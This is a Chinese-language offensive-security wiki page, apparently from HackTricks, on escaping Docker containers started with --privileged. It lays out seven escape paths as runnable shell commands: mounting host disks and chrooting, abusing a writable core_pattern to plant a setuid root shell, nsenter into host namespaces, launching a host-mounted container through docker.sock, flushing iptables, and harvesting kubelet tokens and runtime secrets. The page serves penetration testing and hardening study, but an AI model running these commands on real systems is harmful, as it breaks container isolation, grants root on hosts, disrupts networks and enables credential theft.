# 从 `--privileged` 容器中逃逸

{{#include ../../../banners/hacktricks-training.md}}

## 概览

使用 `--privileged` 启动的容器并不等同于一个只多了几项权限的普通容器。实际上，`--privileged` 会移除或削弱若干默认的 runtime 保护，这些保护通常用于将工作负载与主机上的危险资源隔离开来。具体效果仍取决于 runtime 与主机，但对 Docker 来说通常会导致：

- 授予所有 capabilities
- 解除 device cgroup 的限制
- 许多 kernel filesystems 不再以只读方式挂载
- 默认被 masked 的 procfs 路径消失
- seccomp filtering 被禁用
- AppArmor 限制被禁用
- SELinux 隔离被禁用或被更宽泛的 label 取代

重要的结果是，privileged 容器通常并不需要依赖微妙的 kernel exploit。在很多情况下，它可以直接与主机设备、面向主机的 kernel filesystems 或 runtime 接口交互，然后 pivot 到主机 shell。

## `--privileged` 不会自动改变的内容

`--privileged` 并不会**自动**加入主机的 PID、network、IPC 或 UTS namespaces。一个 privileged 容器仍然可以拥有私有的 namespaces。这意味着某些逃逸链还需要额外条件，例如：

- 一个主机 bind mount
- host PID sharing
- host networking
- 可见的 host devices
- 可写的 proc/sys 接口

这些条件在真实的误配置中常常很容易被满足，但它们在概念上与 `--privileged` 本身是分开的。

## 逃逸路径

### 1. 通过暴露的设备挂载主机磁盘

privileged 容器通常在 `/dev` 下能看到更多的 device nodes。如果主机的 block device 可见，最简单的逃逸方式是将其挂载并使用 `chroot` 进入主机文件系统：
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
如果根分区不明显，首先枚举块布局：
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
如果实际路径是在可写的主机挂载点中植入一个 setuid helper，而不是使用 `chroot`，请记住并非所有文件系统都支持 setuid bit。一个快速的主机端能力检查是：
```bash
mount | grep -v "nosuid"
```
这是有用的，因为在 `nosuid` 文件系统下的可写路径对于经典的“放置一个 setuid shell 并在稍后执行”工作流程来说吸引力要小得多。

这里被滥用的弱化保护包括：

- 完全的设备暴露
- 广泛的 capabilities，尤其是 `CAP_SYS_ADMIN`

相关页面：

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. 挂载或重用主机的 bind mount 并使用 `chroot`

如果主机根文件系统已经挂载在容器内，或者容器因为是 privileged 而可以创建必要的挂载，那么主机 shell 通常只相距一次 `chroot`：
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
如果不存在 host root bind mount，但可以访问 host storage，请创建一个：
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
此路径滥用：

- mount 限制被削弱
- full capabilities
- 缺乏 MAC 约束

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. 滥用可写的 `/proc/sys` 或 `/sys`

`--privileged` 的一个重要后果是 procfs 和 sysfs 的防护会变得更弱。这可能会暴露通常被屏蔽或以只读方式挂载的面向主机的内核接口。

一个典型例子是 `core_pattern`：
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
其他高价值路径包括：
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
此路径滥用：

- 缺少 masked paths
- 缺少 read-only system paths

相关页面：

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Use Full Capabilities For Mount- Or Namespace-Based Escape

特权容器会获得通常从标准容器中移除的特权（capabilities），包括 `CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_SYS_MODULE`、`CAP_NET_ADMIN` 等等。只要存在其他暴露面，这通常就足以将本地立足点升级为主机逃逸。

一个简单的例子是挂载额外的文件系统并进入命名空间：
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
如果还共享了主机 PID，该步骤会更短：
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
本路径滥用：

- 默认的特权能力集
- 可选的主机 PID 共享

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. 通过运行时套接字逃逸

具有特权的容器经常会看到主机运行时状态或套接字。如果可以访问 Docker、containerd 或 CRI-O 套接字，最简单的方法通常是使用运行时 API 启动第二个具有主机访问权限的容器：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
对于 containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
该路径滥用：

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. 移除网络隔离的副作用

`--privileged` 本身并不会加入主机网络命名空间，但如果容器也具有 `--network=host` 或其他主机网络访问权限，整个网络栈就变得可修改：
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
这并不总是直接获得主机 shell，但可能导致 denial of service、traffic interception，或访问仅限 loopback 的管理服务。

相关页面：

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. 读取主机 Secrets 和运行时状态

即使不能立即获得可靠的 shell 逃逸，特权容器通常也有足够的权限读取主机 secrets、kubelet 状态、运行时元数据，以及相邻容器的文件系统：
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
如果 `/var` 被 host-mounted 或运行时目录可见，这甚至可能在获得 host shell 之前就足以用于 lateral movement 或 cloud/Kubernetes credential theft。

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## 检查

下面的命令旨在确认哪些 privileged-container escape families 立即可行。
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
这里值得注意的有：

- 完整的 capability 集合，尤其是 `CAP_SYS_ADMIN`
- 对 proc/sys 的可写暴露
- 可见的 host 设备
- 缺少 seccomp 和 MAC 限制
- 运行时 sockets 或 host root bind mounts

其中任意一项可能就足以进行 post-exploitation。多项同时存在通常意味着 container 在功能上距离 host compromise 只有一两条命令的差距。

## 相关页面

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
